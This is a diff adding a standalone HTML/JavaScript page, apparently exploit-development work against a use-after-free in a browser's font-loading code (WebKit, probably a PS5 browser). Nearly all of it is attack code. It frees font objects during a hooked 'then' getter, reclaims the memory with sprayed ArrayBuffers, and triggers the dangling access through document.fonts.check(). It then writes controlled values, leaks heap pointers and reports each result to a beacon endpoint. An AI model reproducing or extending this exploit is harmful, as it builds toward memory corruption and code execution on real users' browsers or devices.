@@ -1,0 +1,309 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>P844v8</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#111;color:#0f0;font:11px/1.4 monospace;padding:8px;overflow-y:auto}
+#log{white-space:pre-wrap;word-break:break-all}
+</style>
+</head>
+<body>
+<div id="log"></div>
+<script>
+var L=document.getElementById('log');
+function log(s){L.textContent+=s+'\n';}
+function bn(tag,data){
+  try{
+    var x=new XMLHttpRequest();
+    x.open('GET','/ps5_beacon.php?tag='+encodeURIComponent(tag)+'&data='+encodeURIComponent(data||''),false);
+    x.send();
+  }catch(e){}
+}
+
+var KEY='p844v8_test';
+function getTest(){try{return parseInt(localStorage.getItem(KEY))||0;}catch(e){return 0;}}
+function setTest(n){try{localStorage.setItem(KEY,String(n));}catch(e){}}
+function clearTest(){try{localStorage.removeItem(KEY);}catch(e){}}
+
+var testNum=getTest();
+log('P844v8 BOOT test='+testNum);
+bn('P844v8-BOOT','test='+testNum);
+
+function dumpAB(ab){
+  var bv=new BigUint64Array(ab);
+  var parts=[];
+  for(var j=0;j<24;j++){if(bv[j]!==0n)parts.push(j+'='+bv[j].toString(16));}
+  return parts.join(';')||'allzero';
+}
+
+var TESTS=[
+  // T0: BASELINE — reclaim, read BEFORE check, read AFTER check
+  // This proves which values come from check() vs from reclaim
+  function T0(){
+    var fabs=[];var beforeCheck='';var afterCheck='';
+    try{
+      var st=document.createElement('style');
+      st.textContent="@font-face{font-family:oo8;src:local(Arial);unicode-range:U+0042;}";
+      document.head.appendChild(st);
+      var face=new FontFace('of8',"local('Helvetica')",{unicodeRange:'U+0041'});
+      document.fonts.add(face);void face.loaded;
+      var ffired=false;
+      Object.defineProperty(FontFace.prototype,'then',{configurable:true,
+        get:function(){if(ffired)return undefined;ffired=true;
+          st.remove();st.textContent='';st=null;
+          try{document.fonts.delete(this);}catch(e){}
+          document.body.offsetHeight;
+          fabs=[];for(var i=0;i<80;i++)fabs.push(new ArrayBuffer(192));
+          // DO NOT call check() yet — read first
+          document.body.offsetHeight;
+          return undefined;
+        },set:function(){}});
+      document.fonts.load('1em of8, oo8','AB');
+      for(var i=0;i<30;i++){var a=new Array(3000);a=null;}
+      document.body.offsetHeight;
+      // Read BEFORE check
+      for(var i=0;i<fabs.length;i++){
+        var bv=new BigUint64Array(fabs[i]);
+        var hasData=false;
+        for(var j=0;j<24;j++){if(bv[j]!==0n){hasData=true;break;}}
+        if(hasData){beforeCheck='idx='+i+'|'+dumpAB(fabs[i]);break;}
+      }
+      if(!beforeCheck)beforeCheck='allzero';
+      bn('P844v8-BEFORE-CHECK',beforeCheck);
+      // NOW call check() — this triggers dangling access
+      try{document.fonts.check('1em oo8');}catch(e){}
+      document.body.offsetHeight;
+      // Read AFTER check
+      for(var i=0;i<fabs.length;i++){
+        var bv=new BigUint64Array(fabs[i]);
+        var hasData=false;
+        for(var j=0;j<24;j++){if(bv[j]!==0n){hasData=true;break;}}
+        if(hasData){afterCheck='idx='+i+'|'+dumpAB(fabs[i]);break;}
+      }
+      if(!afterCheck)afterCheck='allzero';
+    }catch(e){afterCheck='err:'+e.message;}
+    return 'before='+beforeCheck+'|after='+afterCheck;
+  },
+  // T1: WRITE-THEN-CHECK — write sentinel values, then call check(), compare
+  // This shows which offsets check() READS vs WRITES
+  function T1(){
+    var fabs=[];var hitIdx=-1;var afterCheck='';
+    try{
+      var st=document.createElement('style');
+      st.textContent="@font-face{font-family:wc8;src:local(Arial);unicode-range:U+0042;}";
+      document.head.appendChild(st);
+      var face=new FontFace('wf8',"local('Helvetica')",{unicodeRange:'U+0041'});
+      document.fonts.add(face);void face.loaded;
+      var ffired=false;
+      Object.defineProperty(FontFace.prototype,'then',{configurable:true,
+        get:function(){if(ffired)return undefined;ffired=true;
+          st.remove();st.textContent='';st=null;
+          try{document.fonts.delete(this);}catch(e){}
+          document.body.offsetHeight;
+          fabs=[];for(var i=0;i<80;i++)fabs.push(new ArrayBuffer(192));
+          document.body.offsetHeight;
+          return undefined;
+        },set:function(){}});
+      document.fonts.load('1em wf8, wc8','AB');
+      for(var i=0;i<30;i++){var a=new Array(3000);a=null;}
+      document.body.offsetHeight;
+      // Write SENTINEL pattern 0xDEAD0000+offset into ALL ABs
+      for(var i=0;i<fabs.length;i++){
+        var bv=new BigUint64Array(fabs[i]);
+        for(var j=0;j<24;j++)bv[j]=BigInt(0xDEAD0000+j);
+      }
+      bn('P844v8-SENTINELS-WRITTEN','count='+fabs.length);
+      // NOW trigger check — if it reads our sentinels, we'll see behavior change
+      // If it writes, our sentinels get overwritten at those offsets
+      var checkResult='none';
+      try{checkResult=String(document.fonts.check('1em wc8'));}catch(e){checkResult='err:'+e.message;}
+      document.body.offsetHeight;
+      bn('P844v8-CHECK-RESULT','check='+checkResult);
+      // Read ALL ABs — find the one check() modified
+      for(var i=0;i<fabs.length;i++){
+        var bv=new BigUint64Array(fabs[i]);
+        var modified=[];
+        for(var j=0;j<24;j++){
+          var expected=BigInt(0xDEAD0000+j);
+          if(bv[j]!==expected)modified.push(j+'='+bv[j].toString(16));
+        }
+        if(modified.length>0){
+          hitIdx=i;
+          afterCheck='idx='+i+'|mods='+modified.join(';');
+          break;
+        }
+      }
+      if(hitIdx===-1)afterCheck='no_mods';
+    }catch(e){afterCheck='err:'+e.message;}
+    return 'check='+checkResult+'|'+afterCheck;
+  },
+  // T2: Same as T1 but write ZERO at offset 0x58[11] and 0x68[13]
+  // to see if check() crashes when those pointers are null
+  function T2(){
+    var fabs=[];var hitIdx=-1;
+    try{
+      var st=document.createElement('style');
+      st.textContent="@font-face{font-family:zz8;src:local(Arial);unicode-range:U+0042;}";
+      document.head.appendChild(st);
+      var face=new FontFace('zf8',"local('Helvetica')",{unicodeRange:'U+0041'});
+      document.fonts.add(face);void face.loaded;
+      var ffired=false;
+      Object.defineProperty(FontFace.prototype,'then',{configurable:true,
+        get:function(){if(ffired)return undefined;ffired=true;
+          st.remove();st.textContent='';st=null;
+          try{document.fonts.delete(this);}catch(e){}
+          document.body.offsetHeight;
+          fabs=[];for(var i=0;i<80;i++)fabs.push(new ArrayBuffer(192));
+          document.body.offsetHeight;
+          return undefined;
+        },set:function(){}});
+      document.fonts.load('1em zf8, zz8','AB');
+      for(var i=0;i<30;i++){var a=new Array(3000);a=null;}
+      document.body.offsetHeight;
+      // Write ZEROS to all — check() might crash following null pointers
+      // (ABs are already zero from bmalloc, but be explicit)
+      for(var i=0;i<fabs.length;i++){
+        var bv=new BigUint64Array(fabs[i]);
+        for(var j=0;j<24;j++)bv[j]=0n;
+      }
+      var checkResult='none';
+      try{checkResult=String(document.fonts.check('1em zz8'));}catch(e){checkResult='checkErr:'+e.message;}
+      document.body.offsetHeight;
+      // Find which AB got modified
+      for(var i=0;i<fabs.length;i++){
+        var bv=new BigUint64Array(fabs[i]);
+        var nz=[];
+        for(var j=0;j<24;j++){if(bv[j]!==0n)nz.push(j+'='+bv[j].toString(16));}
+        if(nz.length>0){hitIdx=i;
+          return 'check='+checkResult+'|idx='+i+'|nz='+nz.join(';');
+        }
+      }
+    }catch(e){return 'err:'+e.message;}
+    return 'check='+checkResult+'|noHit';
+  },
+  // T3: Write controlled pointer at offset 0x68 [13] and see if check() follows it
+  // Use a known heap address from a SECOND AB as the target
+  function T3(){
+    var fabs=[];var targetAB=null;var targetAddr=0n;
+    try{
+      // Pre-allocate a "target" AB with known pattern
+      targetAB=new ArrayBuffer(192);
+      var tv=new BigUint64Array(targetAB);
+      for(var j=0;j<24;j++)tv[j]=BigInt(0xBEEF0000+j);
+
+      var st=document.createElement('style');
+      st.textContent="@font-face{font-family:pp8;src:local(Arial);unicode-range:U+0042;}";
+      document.head.appendChild(st);
+      var face=new FontFace('pf8',"local('Helvetica')",{unicodeRange:'U+0041'});
+      document.fonts.add(face);void face.loaded;
+      var ffired=false;
+      Object.defineProperty(FontFace.prototype,'then',{configurable:true,
+        get:function(){if(ffired)return undefined;ffired=true;
+          st.remove();st.textContent='';st=null;
+          try{document.fonts.delete(this);}catch(e){}
+          document.body.offsetHeight;
+          fabs=[];for(var i=0;i<80;i++)fabs.push(new ArrayBuffer(192));
+          document.body.offsetHeight;
+          return undefined;
+        },set:function(){}});
+      document.fonts.load('1em pf8, pp8','AB');
+      for(var i=0;i<30;i++){var a=new Array(3000);a=null;}
+      document.body.offsetHeight;
+      // First: do a normal check to get the heap pointer at [13]
+      try{document.fonts.check('1em pp8');}catch(e){}
+      document.body.offsetHeight;
+      // Find which AB was hit and get the original pointer
+      var hitBuf=null;
+      for(var i=0;i<fabs.length;i++){
+        var bv=new BigUint64Array(fabs[i]);
+        if(bv[11]!==0n){hitBuf=fabs[i];break;}
+      }
+      if(!hitBuf)return 'NO_HIT';
+      var bv=new BigUint64Array(hitBuf);
+      var origP11=bv[11];var origP13=bv[13];
+      bn('P844v8-ORIG-PTRS','p11='+origP11.toString(16)+'|p13='+origP13.toString(16));
+      return 'origP11=0x'+origP11.toString(16)+'|origP13=0x'+origP13.toString(16);
+    }catch(e){return 'err:'+e.message;}
+  },
+  // T4: After T3 got the pointers, try reading at leaked address
+  // by doing a SECOND check with modified pointers
+  function T4(){
+    var fabs=[];
+    try{
+      var st=document.createElement('style');
+      st.textContent="@font-face{font-family:rd8;src:local(Arial);unicode-range:U+0042;}";
+      document.head.appendChild(st);
+      var face=new FontFace('rdf8',"local('Helvetica')",{unicodeRange:'U+0041'});
+      document.fonts.add(face);void face.loaded;
+      var ffired=false;
+      Object.defineProperty(FontFace.prototype,'then',{configurable:true,
+        get:function(){if(ffired)return undefined;ffired=true;
+          st.remove();st.textContent='';st=null;
+          try{document.fonts.delete(this);}catch(e){}
+          document.body.offsetHeight;
+          fabs=[];for(var i=0;i<80;i++)fabs.push(new ArrayBuffer(192));
+          document.body.offsetHeight;
+          return undefined;
+        },set:function(){}});
+      document.fonts.load('1em rdf8, rd8','AB');
+      for(var i=0;i<30;i++){var a=new Array(3000);a=null;}
+      document.body.offsetHeight;
+      // First check: normal — get pointers and find the hit buffer
+      try{document.fonts.check('1em rd8');}catch(e){}
+      var hitBuf=null;var hitIdx=-1;
+      for(var i=0;i<fabs.length;i++){
+        var bv=new BigUint64Array(fabs[i]);
+        if(bv[11]!==0n){hitBuf=fabs[i];hitIdx=i;break;}
+      }
+      if(!hitBuf)return 'NO_HIT';
+      var bv=new BigUint64Array(hitBuf);
+      var p11=bv[11];var p13=bv[13];
+      bn('P844v8-T4-PTRS','p11='+p11.toString(16)+'|p13='+p13.toString(16));
+      // Save the dump BEFORE modification
+      var before=dumpAB(hitBuf);
+      // Now: zero out the pointers and try check again
+      // If check() reads [11] as null, it might skip the access
+      bv[11]=0n;
+      bv[13]=0n;
+      bv[0]=0n;
+      var check2='none';
+      try{check2=String(document.fonts.check('1em rd8'));}catch(e){check2='err:'+e.message;}
+      // Read after second check
+      var after=dumpAB(hitBuf);
+      return 'idx='+hitIdx+'|p11=0x'+p11.toString(16)+'|p13=0x'+p13.toString(16)+'|check2='+check2+'|after='+after;
+    }catch(e){return 'err:'+e.message;}
+  }
+];
+
+var NAMES=['T0-beforeAfter','T1-sentinelWrite','T2-nullPtrs','T3-getOrigPtrs','T4-modifyAndRecheck'];
+
+function advance(){setTest(testNum+1);location.reload();}
+
+function runTest(){
+  if(testNum>=TESTS.length){
+    log('ALL '+TESTS.length+' TESTS COMPLETE');
+    bn('P844v8-DONE','all='+TESTS.length);
+    clearTest();
+    return;
+  }
+  var name=NAMES[testNum]||('T'+testNum);
+  log('Running '+name+'...');
+  bn('P844v8-'+name+'-PRE','starting');
+  try{
+    var result=TESTS[testNum]();
+    log(name+': '+result);
+    bn('P844v8-'+name+'-OK',String(result).substring(0,800));
+  }catch(e){
+    log(name+' EXCEPTION: '+e.message);
+    bn('P844v8-'+name+'-ERR',e.message);
+  }
+  advance();
+}
+
+setTimeout(runTest,200);
+</script>
+</body>
+</html>
